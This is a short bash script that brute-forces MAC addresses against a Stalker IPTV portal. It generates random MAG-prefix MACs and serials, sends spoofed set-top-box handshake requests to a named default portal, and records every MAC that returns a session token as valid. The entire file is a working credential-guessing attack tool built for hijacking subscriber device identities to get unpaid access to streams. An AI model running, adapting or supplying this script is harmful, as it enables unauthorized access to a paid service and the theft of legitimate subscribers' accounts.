#!/bin/bash
# bulk-mac-test.sh — Fast MAC brute force against Stalker portal
# Usage: ./bulk-mac-test.sh [count] [portal_url]
#   ./bulk-mac-test.sh          # test 100 random MACs
#   ./bulk-mac-test.sh 500      # test 500
#   ./bulk-mac-test.sh 50 http://other.portal:8080

COUNT="${1:-100}"
PORTAL="${2:-http://www.streamtv.to:8080}"
HANDLE="${PORTAL}/stalker_portal/server/load.php?type=stb&action=handshake&prehash=0&token=&JsHttpRequest=1-xml"
OUTFILE="valid_macs.txt"
VALID=0
FAIL=0

echo "[*] Bulk MAC test — $COUNT attempts against $PORTAL"
echo "[*] Valid MACs saved to: $OUTFILE"
echo ""

for i in $(seq 1 "$COUNT"); do
    # Random 00:1A:79 MAC
    MAC="00:1A:79:$(printf '%02X' $((RANDOM % 256))):$(printf '%02X' $((RANDOM % 256))):$(printf '%02X' $((RANDOM % 256)))"
    SERIAL="$(openssl rand -hex 7 | tr '[:lower:]' '[:upper:]')"
    
    TOKEN=$(curl -s --max-time 3 \
      -H "User-Agent: Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3" \
      -b "mac=$MAC; sn=$SERIAL; stb_lang=en" \
      "$HANDLE" | grep -oP '"Token":"\K[^"]+')
    
    if [ -n "$TOKEN" ]; then
        echo "[+] VALID MAC: $MAC (token: ${TOKEN:0:16}...)"
        echo "$MAC" >> "$OUTFILE"
        VALID=$((VALID + 1))
    else
        echo "[-] $MAC"
        FAIL=$((FAIL + 1))
    fi
done

echo ""
echo "[*] Done. Valid: $VALID / $COUNT (rate: $((VALID * 100 / COUNT))%)"
echo "[*] Results: $OUTFILE ($(wc -l < "$OUTFILE" 2>/dev/null || echo 0) total MACs)"
